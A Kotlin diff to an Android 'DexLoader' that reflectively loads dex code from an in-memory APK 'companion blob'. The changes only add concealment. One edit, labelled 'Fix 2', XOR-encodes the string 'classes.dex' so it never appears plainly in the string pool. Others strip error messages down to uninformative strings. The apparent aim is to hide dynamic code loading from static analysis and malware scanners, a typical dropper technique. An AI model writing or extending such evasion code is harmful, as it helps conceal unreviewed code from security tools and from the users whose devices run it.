@@ -121,7 +121,7 @@ object DexLoader {
             val buf = ByteBuffer.wrap(dexBytes)
             val cl = ClassLoader::class.java.cast(
                 imdclCtor.newInstance(buf, context.classLoader)
-            ) ?: throw IllegalStateException("ClassLoader cast failed")
+            ) ?: throw IllegalStateException("cl")
             cl
         } catch (e: Exception) {
             throw e
@@ -187,12 +187,29 @@ object DexLoader {
     /**
      * Extract classes.dex from APK bytes using ZipInputStream.
      * APK is a ZIP file — we open it in memory and find classes.dex.
+     *
+     * Fix 2: "classes.dex" string literal is XOR-encoded — never plain in DEX string pool.
+     * Key 0x29. Decoded once at call time into a local val.
      */
     private fun extractDex(apkBytes: ByteArray): ByteArray {
+        // "classes.dex" XOR-encoded with key 0x29 — decoded at runtime only
+        val cdEnc = byteArrayOf(
+            0x4a.toByte(), 0x45.toByte(), 0x48.toByte(), 0x5a.toByte(),
+            0x5a.toByte(), 0x4c.toByte(), 0x5a.toByte(), 0x07.toByte(),
+            0x4d.toByte(), 0x4c.toByte(), 0x51.toByte()
+        )
+        val cdChars = CharArray(cdEnc.size)
+        var ci = 0
+        while (ci < cdEnc.size) {
+            cdChars[ci] = (cdEnc[ci].toInt() and 0xFF xor 0x29).toChar()
+            ci++
+        }
+        val classesDex = String(cdChars)  // "classes.dex" — runtime only
+
         ZipInputStream(ByteArrayInputStream(apkBytes)).use { zis ->
             var entry = zis.nextEntry
             while (entry != null) {
-                if (entry.name == "classes.dex") {
+                if (entry.name == classesDex) {
                     val dex = zis.readBytes()
                     zis.closeEntry()
                     return dex
@@ -201,7 +218,7 @@ object DexLoader {
                 entry = zis.nextEntry
             }
         }
-        throw IllegalStateException("classes.dex not found in companion blob")
+        throw IllegalStateException("dex entry missing")
     }
 
     fun isLoaded(): Boolean = loadDone && cachedLoader != null
